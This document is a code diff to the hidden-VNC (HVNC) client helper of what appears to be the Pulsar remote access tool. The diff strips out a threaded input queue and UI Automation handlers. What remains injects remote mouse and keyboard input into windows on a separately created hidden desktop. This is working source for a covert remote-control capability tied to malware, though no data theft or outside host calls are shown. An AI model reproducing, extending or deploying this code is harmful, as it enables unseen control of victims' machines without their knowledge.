@@ -2,13 +2,9 @@
 using Pulsar.Common.Messages.Monitoring.HVNC;
 using Pulsar.Common.Messages.Monitoring.RemoteDesktop;
 using System;
-using System.Collections.Concurrent;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Threading;
-using System.Windows;
-using System.Windows.Automation;
 
 namespace Pulsar.Client.Helper.HVNC
 {
@@ -99,10 +95,10 @@ namespace Pulsar.Client.Helper.HVNC
 
         [DllImport("user32.dll")]
         private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
-        
+
         [DllImport("user32.dll")]
         private static extern bool GetClientRect(IntPtr hWnd, out RECT lpRect);
-        
+
         [DllImport("user32.dll")]
         private static extern IntPtr GetDesktopWindow();
 
@@ -113,8 +109,8 @@ namespace Pulsar.Client.Helper.HVNC
         private static extern short GetKeyState(int nVirtKey);
 
         [DllImport("user32.dll")]
-        private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, 
-            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] System.Text.StringBuilder pwszBuff, 
+        private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
+            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] System.Text.StringBuilder pwszBuff,
             int cchBuff, uint wFlags);
 
         [DllImport("user32.dll")]
@@ -190,7 +186,6 @@ namespace Pulsar.Client.Helper.HVNC
         private const int VK_LMENU = 0xA4; // Left Alt
         private const int VK_RMENU = 0xA5; // Right Alt
         private const int VK_CAPITAL = 0x14; // Caps Lock
-        private const int VK_SPACE = 0x20;
 
         #endregion
 
@@ -201,29 +196,13 @@ namespace Pulsar.Client.Helper.HVNC
         private POINT lastClickCoords = new POINT { x = 0, y = 0 };
         private POINT lastWindowDimensions = new POINT { x = 0, y = 0 };
         private IntPtr windowToMove = IntPtr.Zero;
-    private IntPtr workingWindow = IntPtr.Zero;
-    private static readonly object syncLock = new object();
-
-    private readonly BlockingCollection<InputMessage> _inputQueue = new BlockingCollection<InputMessage>(new ConcurrentQueue<InputMessage>());
-    private readonly CancellationTokenSource _inputCancellation = new CancellationTokenSource();
-    private readonly Thread _inputWorker;
+        private IntPtr workingWindow = IntPtr.Zero;
+        private static readonly object syncLock = new object();
 
         private bool isShiftPressed = false;
         private bool isControlPressed = false;
         private bool isAltPressed = false;
         private bool isCapsLockOn = false;
-
-        private bool automationClickArmed = false;
-        private POINT automationClickScreen;
-        private IntPtr automationClickWindow = IntPtr.Zero;
-        private IntPtr automationClickDownWParam = IntPtr.Zero;
-        private IntPtr automationClickDownLParam = IntPtr.Zero;
-
-        private bool automationEnabled = true;
-        private int automationFailureCount = 0;
-        private DateTime automationRetryAfter = DateTime.MinValue;
-        private const int AUTOMATION_FAILURE_THRESHOLD = 3;
-        private static readonly TimeSpan AUTOMATION_RETRY_BACKOFF = TimeSpan.FromMinutes(1);
 
         /// <summary>
         /// Gets the desktop handle.
@@ -247,15 +226,8 @@ namespace Pulsar.Client.Helper.HVNC
                 desktopHandle = CreateDesktop(desktopName, IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
             }
             this.Desktop = desktopHandle;
-            
-            InitializeModifierKeyStates();
 
-            _inputWorker = new Thread(() => ProcessInputQueue(_inputCancellation.Token))
-            {
-                IsBackground = true,
-                Name = "HVNC Input Worker"
-            };
-            _inputWorker.Start();
+            InitializeModifierKeyStates();
         }
 
         /// <summary>
@@ -263,26 +235,6 @@ namespace Pulsar.Client.Helper.HVNC
         /// </summary>
         public void Dispose()
         {
-            _inputQueue.CompleteAdding();
-            _inputCancellation.Cancel();
-
-            if (_inputWorker != null && _inputWorker.IsAlive)
-            {
-                try
-                {
-                    if (!_inputWorker.Join(TimeSpan.FromSeconds(2)))
-                    {
-                        _inputWorker.Join();
-                    }
-                }
-                catch (ThreadStateException)
-                {
-                }
-            }
-
-            _inputQueue.Dispose();
-            _inputCancellation.Dispose();
-
             CloseDesktop(this.Desktop);
             GC.Collect();
         }
@@ -312,9 +264,9 @@ namespace Pulsar.Client.Helper.HVNC
         private void HandleKeyboardInput(uint msg, IntPtr wParam, IntPtr lParam, IntPtr targetWindow)
         {
             int virtualKey = wParam.ToInt32();
-            
+
             UpdateModifierKeyState(msg, virtualKey);
-            
+
             if (msg == WM_KEYDOWN)
             {
                 if (IsModifierKey(virtualKey))
@@ -323,10 +275,10 @@ namespace Pulsar.Client.Helper.HVNC
                     PostMessage(targetWindow, msg, wParam, modifierLParam);
                     return;
                 }
-                
+
                 char[] chars = VirtualKeyToChar(virtualKey);
                 bool isPrintableChar = (chars != null && chars.Length > 0 && chars[0] != '\0');
-                
+
                 if (isPrintableChar)
                 {
                     IntPtr charLParam = BuildKeyboardLParam(WM_CHAR, wParam);
@@ -363,7 +315,7 @@ namespace Pulsar.Client.Helper.HVNC
         private void UpdateModifierKeyState(uint msg, int virtualKey)
         {
             bool keyDown = (msg == WM_KEYDOWN);
-            
+
             switch (virtualKey)
             {
                 case VK_SHIFT:
@@ -371,19 +323,19 @@ namespace Pulsar.Client.Helper.HVNC
                 case VK_RSHIFT:
                     isShiftPressed = keyDown;
                     break;
-                    
+
                 case VK_CONTROL:
                 case VK_LCONTROL:
                 case VK_RCONTROL:
                     isControlPressed = keyDown;
                     break;
-                    
+
                 case VK_MENU:
                 case VK_LMENU:
                 case VK_RMENU:
                     isAltPressed = keyDown;
                     break;
-                    
+
                 case VK_CAPITAL:
                     if (keyDown)
                     {
@@ -404,40 +356,40 @@ namespace Pulsar.Client.Helper.HVNC
             {
                 return null;
             }
-            
+
             byte[] keyboardState = new byte[256];
-            
+
             if (isShiftPressed)
             {
                 keyboardState[VK_SHIFT] = 0x80;
             }
-            
+
             if (isControlPressed)
             {
                 keyboardState[VK_CONTROL] = 0x80;
             }
-            
+
             if (isAltPressed)
             {
                 keyboardState[VK_MENU] = 0x80;
             }
-            
+
             if (isCapsLockOn)
             {
                 keyboardState[VK_CAPITAL] = 0x01;
             }
-            
+
 
             var buffer = new StringBuilder(64);
             uint scanCode = MapVirtualKey((uint)virtualKey, 0);
-            
+
             int result = ToUnicode((uint)virtualKey, scanCode, keyboardState, buffer, buffer.Capacity, 0);
-            
+
             if (result > 0)
             {
                 return buffer.ToString().Substring(0, result).ToCharArray();
             }
-            
+
             return null;
         }
 
@@ -474,7 +426,7 @@ namespace Pulsar.Client.Helper.HVNC
         private bool IsNonPrintableKey(int virtualKey)
         {
             if (virtualKey >= 0x70 && virtualKey <= 0x7B) return true;
-            
+
             switch (virtualKey)
             {
                 case 0x21: // VK_PRIOR (Page Up)
@@ -512,24 +464,24 @@ namespace Pulsar.Client.Helper.HVNC
         {
             int vk = wParam.ToInt32();
             uint scanCode = MapVirtualKey((uint)vk, 0);
-            
+
             int lParam = 0;
-            
+
             lParam |= 1;
-            
+
             lParam |= (int)(scanCode << 16);
-            
+
             if (IsExtendedKey(vk))
             {
                 lParam |= (1 << 24);
             }
-            
+
             if (message == WM_KEYUP)
             {
                 lParam |= (1 << 30);
                 lParam |= (1 << 31);
             }
-            
+
             return new IntPtr(lParam);
         }
 
@@ -622,77 +574,11 @@ namespace Pulsar.Client.Helper.HVNC
         /// <param name="lParam">The lParam of the message.</param>
         public void Input(uint msg, IntPtr wParam, IntPtr lParam)
         {
-            if (_inputQueue.IsAddingCompleted)
-            {
-                return;
-            }
-
-            try
-            {
-                _inputQueue.Add(new InputMessage
-                {
-                    Message = msg,
-                    WParam = wParam,
-                    LParam = lParam
-                });
-            }
-            catch (ObjectDisposedException)
-            {
-                // handler is disposing; ignore input
-            }
-            catch (InvalidOperationException)
-            {
-                // queue has been marked as complete; drop the input
-            }
-        }
-
-        private void ProcessInputQueue(CancellationToken cancellationToken)
-        {
-            while (!cancellationToken.IsCancellationRequested)
-            {
-                try
-                {
-                    if (_inputQueue.TryTake(out InputMessage inputMessage, Timeout.Infinite, cancellationToken))
-                    {
-                        try
-                        {
-                            ProcessInputMessage(inputMessage);
-                        }
-                        catch (Exception ex)
-                        {
-                            Debug.WriteLine($"HVNC input processing error: {ex.Message}");
-                        }
-                    }
-                }
-                catch (OperationCanceledException)
-                {
-                    break;
-                }
-            }
-
-            while (_inputQueue.TryTake(out InputMessage remainingMessage))
-            {
-                try
-                {
-                    ProcessInputMessage(remainingMessage);
-                }
-                catch (Exception ex)
-                {
-                    Debug.WriteLine($"HVNC input processing error during drain: {ex.Message}");
-                }
-            }
-        }
-
-        private void ProcessInputMessage(InputMessage inputMessage)
-        {
             lock (syncLock)
             {
                 SetThreadDesktop(this.Desktop);
 
-                uint msg = inputMessage.Message;
-                IntPtr wParam = inputMessage.WParam;
-                IntPtr lParam = inputMessage.LParam;
-
+                // Handle mouse messages
                 if (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP ||
                     msg == WM_RBUTTONDOWN || msg == WM_RBUTTONUP ||
                     msg == WM_MOUSEMOVE)
@@ -704,35 +590,9 @@ namespace Pulsar.Client.Helper.HVNC
                     bool isLeft = (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP);
                     bool isUp = (msg == WM_LBUTTONUP || msg == WM_RBUTTONUP);
 
-                    if (msg == WM_LBUTTONDOWN)
-                    {
-                        if (ShouldHandleWithUIAutomation(x, y, out IntPtr automationTarget))
-                        {
-                            automationClickArmed = true;
-                            automationClickScreen = new POINT { x = x, y = y };
-                            automationClickWindow = automationTarget != IntPtr.Zero ? automationTarget : WindowFromPoint(cursorPosition);
-                            automationClickDownWParam = isLeft ? new IntPtr(MK_LBUTTON) : new IntPtr(MK_RBUTTON);
-                            automationClickDownLParam = MakeLParam(cursorPosition.x, cursorPosition.y);
-                            workingWindow = automationClickWindow;
-                            return;
-                        }
-                    }
-
-                    if (automationClickArmed && msg == WM_MOUSEMOVE)
-                    {
-                        IntPtr automationWindow = automationClickWindow;
-                        automationClickArmed = false;
-                        automationClickWindow = IntPtr.Zero;
-
-                        if (automationWindow != IntPtr.Zero)
-                        {
-                            PostMessage(automationWindow, WM_LBUTTONDOWN, automationClickDownWParam, automationClickDownLParam);
-                            workingWindow = automationWindow;
-                        }
-                    }
-
                     if (isMovingWindow && isUp && isLeft)
                     {
+                        // If we were moving a window and now released the button, complete the move
                         SetWindowPos(windowToMove, IntPtr.Zero,
                             x - lastClickCoords.x,
                             y - lastClickCoords.y,
@@ -742,50 +602,42 @@ namespace Pulsar.Client.Helper.HVNC
                         isMovingWindow = false;
                     }
 
+                    // Get the window under the cursor
                     IntPtr hwnd = WindowFromPoint(cursorPosition);
                     workingWindow = hwnd;
 
-                    if (automationClickArmed && msg == WM_LBUTTONUP && hwnd == automationClickWindow)
-                    {
-                        bool handled = TryHandleMouseWithUIAutomation(automationClickScreen.x, automationClickScreen.y, hwnd);
-                        automationClickArmed = false;
-                        automationClickWindow = IntPtr.Zero;
-                        if (handled)
-                        {
-                            return;
-                        }
-
-                        PostMessage(hwnd, WM_LBUTTONDOWN, automationClickDownWParam, automationClickDownLParam);
-                        IntPtr fallbackLParam = MakeLParam(cursorPosition.x, cursorPosition.y);
-                        PostMessage(hwnd, msg, IntPtr.Zero, fallbackLParam);
-                        return;
-                    }
-
                     if (hwnd != IntPtr.Zero)
                     {
+                        // Get window information
                         RECT windowRect;
                         GetWindowRect(hwnd, out windowRect);
 
+                        // Calculate window position and size
                         int windowX = windowRect.left;
                         int windowY = windowRect.top;
                         int windowWidth = windowRect.right - windowRect.left;
                         int windowHeight = windowRect.bottom - windowRect.top;
 
+                        // Calculate position relative to window
                         POINT clickCoords = ScreenToWindow(x, y, windowX, windowY, windowWidth, windowHeight);
 
+                        // Get hit test result to determine what part of the window was clicked
                         IntPtr hitTestResult = SendMessage(hwnd, WM_NCHITTEST, IntPtr.Zero, lParam);
                         int hitTestResultInt = hitTestResult.ToInt32();
 
                         if (hitTestResultInt == HTCLOSE && msg == WM_LBUTTONUP)
                         {
+                            // Close button clicked
                             Debug.WriteLine("Closing window");
                             PostMessage(hwnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                             PostMessage(hwnd, WM_DESTROY, IntPtr.Zero, IntPtr.Zero);
                         }
                         else if (hitTestResultInt == HTCAPTION)
                         {
+                            // Title bar clicked
                             if (!isUp && isLeft && msg == WM_LBUTTONDOWN)
                             {
+                                // Start window move operation
                                 lastClickCoords = clickCoords;
                                 lastWindowDimensions = new POINT { x = windowWidth, y = windowHeight };
                                 isMovingWindow = true;
@@ -795,6 +647,7 @@ namespace Pulsar.Client.Helper.HVNC
                         }
                         else if (hitTestResultInt == HTMAXBUTTON && msg == WM_LBUTTONUP)
                         {
+                            // Maximize/Restore button clicked
                             WINDOWPLACEMENT windowPlacement = default;
                             windowPlacement.length = Marshal.SizeOf<WINDOWPLACEMENT>(windowPlacement);
                             GetWindowPlacement(hwnd, ref windowPlacement);
@@ -812,522 +665,28 @@ namespace Pulsar.Client.Helper.HVNC
                         }
                         else if (hitTestResultInt == HTMINBUTTON && msg == WM_LBUTTONUP)
                         {
+                            // Minimize button clicked
                             Debug.WriteLine("Minimizing window");
                             PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_MINIMIZE), IntPtr.Zero);
                         }
                         else
                         {
+                            // Regular window area clicked - forward the mouse message
                             IntPtr param = isLeft ? new IntPtr(MK_LBUTTON) : new IntPtr(MK_RBUTTON);
                             IntPtr translatedLParam = MakeLParam(clickCoords.x, clickCoords.y);
                             PostMessage(hwnd, msg, param, translatedLParam);
                         }
                     }
                 }
-
+                // Handle keyboard messages
                 if (msg == WM_KEYDOWN || msg == WM_KEYUP || msg == WM_CHAR)
                 {
-                    if (TryHandleKeyboardWithUIAutomation(msg, wParam))
-                    {
-                        return;
-                    }
-
                     if (workingWindow != IntPtr.Zero)
                     {
                         HandleKeyboardInput(msg, wParam, lParam, workingWindow);
                     }
                 }
             }
-        }
-
-        #endregion
-
-        #region UI Automation Helpers
-
-        private static bool IsAutomationException(Exception ex)
-        {
-            return ex is ElementNotAvailableException
-                || ex is InvalidOperationException
-                || ex is COMException
-                || ex is ArgumentException;
-        }
-
-        private bool ShouldHandleWithUIAutomation(int screenX, int screenY, out IntPtr targetWindow)
-        {
-            targetWindow = IntPtr.Zero;
-
-            if (!IsAutomationAvailable())
-            {
-                return false;
-            }
-
-            try
-            {
-                AutomationElement element = AutomationElement.FromPoint(new Point(screenX, screenY));
-
-                if (element == null)
-                {
-                    HandleAutomationSkip();
-                    return false;
-                }
-
-                targetWindow = new IntPtr(element.Current.NativeWindowHandle);
-
-                bool supportsActivation = ElementSupportsActivation(element);
-
-                if (!supportsActivation)
-                {
-                    HandleAutomationSkip();
-                }
-
-                return supportsActivation;
-            }
-            catch (Exception ex) when (IsAutomationException(ex))
-            {
-                HandleAutomationFailure(ex);
-                return false;
-            }
-            catch (Exception ex)
-            {
-                HandleAutomationFailure(ex);
-                return false;
-            }
-        }
-
-        private bool TryHandleMouseWithUIAutomation(int screenX, int screenY, IntPtr hwnd)
-        {
-            if (!IsAutomationAvailable())
-            {
-                return false;
-            }
-
-            try
-            {
-                AutomationElement element = AutomationElement.FromPoint(new Point(screenX, screenY));
-
-                if (element == null)
-                {
-                    HandleAutomationSkip();
-                    return false;
-                }
-
-                if (TryInvokeElement(element))
-                {
-                    ResetAutomationFailures();
-                    return true;
-                }
-
-                TreeWalker walker = TreeWalker.ControlViewWalker;
-                AutomationElement parent = walker.GetParent(element);
-
-                while (parent != null)
-                {
-                    if (TryInvokeElement(parent))
-                    {
-                        ResetAutomationFailures();
-                        return true;
-                    }
-
-                    parent = walker.GetParent(parent);
-                }
-
-                HandleAutomationSkip();
-            }
-            catch (Exception ex) when (IsAutomationException(ex))
-            {
-                HandleAutomationFailure(ex);
-                return false;
-            }
-            catch (Exception ex)
-            {
-                HandleAutomationFailure(ex);
-                return false;
-            }
-
-            return false;
-        }
-
-        private bool TryHandleKeyboardWithUIAutomation(uint msg, IntPtr wParam)
-        {
-            if (!IsAutomationAvailable())
-            {
-                return false;
-            }
-
-            try
-            {
-                AutomationElement focused = AutomationElement.FocusedElement;
-
-                if (focused == null)
-                {
-                    HandleAutomationSkip();
-                    return false;
-                }
-
-                if (msg == WM_KEYDOWN)
-                {
-                    int virtualKey = wParam.ToInt32();
-
-                    if (virtualKey == VK_RETURN || virtualKey == VK_SPACE)
-                    {
-                        bool handled = TryInvokeElement(focused);
-                        if (handled)
-                        {
-                            ResetAutomationFailures();
-                        }
-                        else
-                        {
-                            HandleAutomationSkip();
-                        }
-                        return handled;
-                    }
-                }
-                else if (msg == WM_CHAR)
-                {
-                    char ch = (char)wParam.ToInt32();
-                    bool handled = TryApplyCharacterToValuePattern(focused, ch);
-                    if (handled)
-                    {
-                        ResetAutomationFailures();
-                    }
-                    else
-                    {
-                        HandleAutomationSkip();
-                    }
-                    return handled;
-                }
-            }
-            catch (Exception ex) when (IsAutomationException(ex))
-            {
-                HandleAutomationFailure(ex);
-                return false;
-            }
-            catch (Exception ex)
-            {
-                HandleAutomationFailure(ex);
-                return false;
-            }
-
-            return false;
-        }
-
-        private bool TryApplyCharacterToValuePattern(AutomationElement element, char ch)
-        {
-            ValuePattern valuePattern;
-            if (!TryGetPattern(element, ValuePattern.Pattern, out valuePattern))
-            {
-                return false;
-            }
-
-            try
-            {
-                if (valuePattern.Current.IsReadOnly)
-                {
-                    return false;
-                }
-
-                if (ch == '\r' || ch == '\n')
-                {
-                    return TryInvokeElement(element);
-                }
-
-                string currentValue = valuePattern.Current.Value ?? string.Empty;
-
-                if (ch == '\b')
-                {
-                    if (currentValue.Length == 0)
-                    {
-                        return true;
-                    }
-
-                    currentValue = currentValue.Substring(0, currentValue.Length - 1);
-                }
-                else if (!char.IsControl(ch))
-                {
-                    currentValue += ch;
-                }
-                else
-                {
-                    return false;
-                }
-
-                valuePattern.SetValue(currentValue);
-                return true;
-            }
-            catch (Exception ex) when (IsAutomationException(ex))
-            {
-                HandleAutomationFailure(ex);
-                return false;
-            }
-            catch (Exception ex)
-            {
-                HandleAutomationFailure(ex);
-                return false;
-            }
-        }
-
-        private bool ElementSupportsActivation(AutomationElement element)
-        {
-            return ElementSupportsPattern(element, InvokePattern.Pattern) ||
-                   ElementSupportsPattern(element, SelectionItemPattern.Pattern) ||
-                   ElementSupportsPattern(element, TogglePattern.Pattern) ||
-                   ElementSupportsPattern(element, ExpandCollapsePattern.Pattern);
-        }
-
-        private bool ElementSupportsPattern(AutomationElement element, AutomationPattern pattern)
-        {
-            try
-            {
-                object patternObj;
-                bool success = element.TryGetCurrentPattern(pattern, out patternObj) && patternObj != null;
-
-                if (!success)
-                {
-                    HandleAutomationSkip();
-                }
-
-                return success;
-            }
-            catch (Exception ex) when (IsAutomationException(ex))
-            {
-                HandleAutomationFailure(ex);
-                return false;
-            }
-            catch (Exception ex)
-            {
-                HandleAutomationFailure(ex);
-                return false;
-            }
-        }
-
-        private bool TryInvokeElement(AutomationElement element)
-        {
-            if (element == null)
-            {
-                return false;
-            }
-
-            if (TryGetPattern(element, InvokePattern.Pattern, out InvokePattern invokePattern))
-            {
-                try
-                {
-                    invokePattern.Invoke();
-                    ResetAutomationFailures();
-                    return true;
-                }
-                catch (Exception ex) when (IsAutomationException(ex))
-                {
-                    HandleAutomationFailure(ex);
-                }
-                catch (Exception ex)
-                {
-                    HandleAutomationFailure(ex);
-                }
-            }
-
-            if (TryGetPattern(element, SelectionItemPattern.Pattern, out SelectionItemPattern selectionPattern))
-            {
-                try
-                {
-                    selectionPattern.Select();
-                    ResetAutomationFailures();
-                    return true;
-                }
-                catch (Exception ex) when (IsAutomationException(ex))
-                {
-                    HandleAutomationFailure(ex);
-                }
-                catch (Exception ex)
-                {
-                    HandleAutomationFailure(ex);
-                }
-            }
-
-            if (TryGetPattern(element, TogglePattern.Pattern, out TogglePattern togglePattern))
-            {
-                try
-                {
-                    togglePattern.Toggle();
-                    ResetAutomationFailures();
-                    return true;
-                }
-                catch (Exception ex) when (IsAutomationException(ex))
-                {
-                    HandleAutomationFailure(ex);
-                }
-                catch (Exception ex)
-                {
-                    HandleAutomationFailure(ex);
-                }
-            }
-
-            if (TryGetPattern(element, ExpandCollapsePattern.Pattern, out ExpandCollapsePattern expandCollapsePattern))
-            {
-                try
-                {
-                    var state = expandCollapsePattern.Current.ExpandCollapseState;
-
-                    switch (state)
-                    {
-                        case ExpandCollapseState.Collapsed:
-                        case ExpandCollapseState.PartiallyExpanded:
-                            expandCollapsePattern.Expand();
-                            break;
-                        case ExpandCollapseState.Expanded:
-                            expandCollapsePattern.Collapse();
-                            break;
-                    }
-
-                    ResetAutomationFailures();
-                    return true;
-                }
-                catch (Exception ex) when (IsAutomationException(ex))
-                {
-                    HandleAutomationFailure(ex);
-                }
-                catch (Exception ex)
-                {
-                    HandleAutomationFailure(ex);
-                }
-            }
-
-            return false;
-        }
-
-        private bool TryGetPattern<TPattern>(AutomationElement element, AutomationPattern pattern, out TPattern typedPattern) where TPattern : class
-        {
-            typedPattern = null;
-
-            try
-            {
-                object patternObj;
-                if (!element.TryGetCurrentPattern(pattern, out patternObj) || patternObj == null)
-                {
-                    HandleAutomationSkip();
-                    return false;
-                }
-
-                typedPattern = patternObj as TPattern;
-                if (typedPattern == null)
-                {
-                    HandleAutomationSkip();
-                }
-                return typedPattern != null;
-            }
-            catch (Exception ex) when (IsAutomationException(ex))
-            {
-                HandleAutomationFailure(ex);
-                return false;
-            }
-            catch (Exception ex)
-            {
-                HandleAutomationFailure(ex);
-                return false;
-            }
-        }
-
-        private bool IsAutomationAvailable()
-        {
-            if (!automationEnabled && DateTime.UtcNow >= automationRetryAfter)
-            {
-                automationEnabled = true;
-                automationFailureCount = 0;
-            }
-
-            return automationEnabled;
-        }
-
-        private void HandleAutomationFailure(Exception ex)
-        {
-            if (!automationEnabled)
-            {
-                return;
-            }
-
-            bool criticalFailure = IsCriticalAutomationFailure(ex);
-
-            if (criticalFailure)
-            {
-                automationFailureCount = AUTOMATION_FAILURE_THRESHOLD;
-            }
-            else
-            {
-                automationFailureCount++;
-            }
-
-            Debug.WriteLine($"UIA disabled attempt #{automationFailureCount}: {ex.Message}");
-
-            if (automationFailureCount >= AUTOMATION_FAILURE_THRESHOLD)
-            {
-                automationEnabled = false;
-                automationRetryAfter = DateTime.UtcNow + AUTOMATION_RETRY_BACKOFF;
-                automationClickArmed = false;
-                Debug.WriteLine("UIA interactions disabled temporarily due to repeated failures.");
-            }
-        }
-
-        private bool IsCriticalAutomationFailure(Exception ex)
-        {
-            if (ex == null)
-            {
-                return false;
-            }
-
-            if (ex is ElementNotAvailableException)
-            {
-                return true;
-            }
-
-            string message = ex.Message ?? string.Empty;
-
-            if (ContainsIgnoreCase(message, "operation is invalid due to the current state of the object") ||
-                ContainsIgnoreCase(message, "L'op\u00E9ration n'est pas valide en raison de l'\u00E9tat actuel de l'objet") ||
-                ContainsIgnoreCase(message, "target element corresponds to a user interface that is no longer available"))
-            {
-                return true;
-            }
-
-            if (ex is InvalidOperationException invalid &&
-                (invalid.Source?.IndexOf("UIAutomation", StringComparison.OrdinalIgnoreCase) >= 0 ||
-                 invalid.StackTrace?.IndexOf("MS.Internal.Automation", StringComparison.OrdinalIgnoreCase) >= 0))
-            {
-                return true;
-            }
-
-            return false;
-        }
-
-        private static bool ContainsIgnoreCase(string source, string value)
-        {
-            if (string.IsNullOrEmpty(source) || string.IsNullOrEmpty(value))
-            {
-                return false;
-            }
-
-            return source.IndexOf(value, StringComparison.OrdinalIgnoreCase) >= 0;
-        }
-
-        private void HandleAutomationSkip()
-        {
-            if (!automationEnabled)
-            {
-                return;
-            }
-
-            automationFailureCount = Math.Max(automationFailureCount - 1, 0);
-        }
-
-        private void ResetAutomationFailures()
-        {
-            automationFailureCount = 0;
-            automationEnabled = true;
-            automationRetryAfter = DateTime.MinValue;
-        }
-
-        private struct InputMessage
-        {
-            public uint Message;
-            public IntPtr WParam;
-            public IntPtr LParam;
         }
 
         #endregion
